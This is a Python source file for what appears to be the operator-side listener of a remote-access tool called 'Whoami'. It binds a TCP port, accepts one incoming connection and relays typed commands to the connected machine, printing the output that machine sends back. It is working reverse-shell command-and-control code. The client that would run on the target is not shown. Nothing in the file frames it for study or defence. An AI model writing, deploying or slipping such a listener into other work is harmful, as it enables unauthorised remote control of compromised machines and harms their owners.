import socket
import os
import platform

RED = '\033[91m'
GREEN = '\33[92m'
YELLOW = '\33[93m'
END = '\033[0m'

def machine_os():
    try:
        machine_os = platform.system()
        return machine_os

    except Exception as e:
        return(f"\n{RED}[!]{END} Failed To Get The Machine Os.")

def clear():
    if machine_os() == "Windows":
        clear = os.system("cls")
        
    else:
        clear = os.system("clear")


def whoami_listen(listen_host, listen_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((listen_host, listen_port))
        s.listen(1)
        print(f"\n{GREEN}[+]{END} Whoami Started Listening On Host {listen_host} And Port {listen_port}, You Can Stop Listening By Pressing CTRL-C.")
        conn, address = s.accept()
        print(f"\n{GREEN}[+]{END} Whoami New Session Opened {address}")
        
        print("\n[+] Type 'exit' Or Press CTRL-C To Exit.")

        while True:
            command = input(str(f"\nWhoami>{address[0]}: "))

            if command == "exit":
                conn.send(str.encode(command))
                break

            elif command == "clear":
                clear()

            elif len(str.encode(command)) > 0:
                conn.send(str.encode(command))
                client_response = str(conn.recv(102400),"utf-8")
                print(client_response, "\n",end="")


    except KeyboardInterrupt:
        print(f"\n{RED}[!]{END} Whoami Listening Stopped.")

    except socket.error:
        print(socket.error)
        print(f"\n{RED}[!]{END} Failed To Start Listening Try To Close Any Active Listeners Or Check Your Host And Your Port.")

    except Exception as error:
        print(f"\n{error}")
        print (f"\n{RED}[!]{END} Please Check Your Host And Your Port: \n{RED}[!]{END} Host : {listen_host}\n{RED}[!]{END} Port : {listen_port}")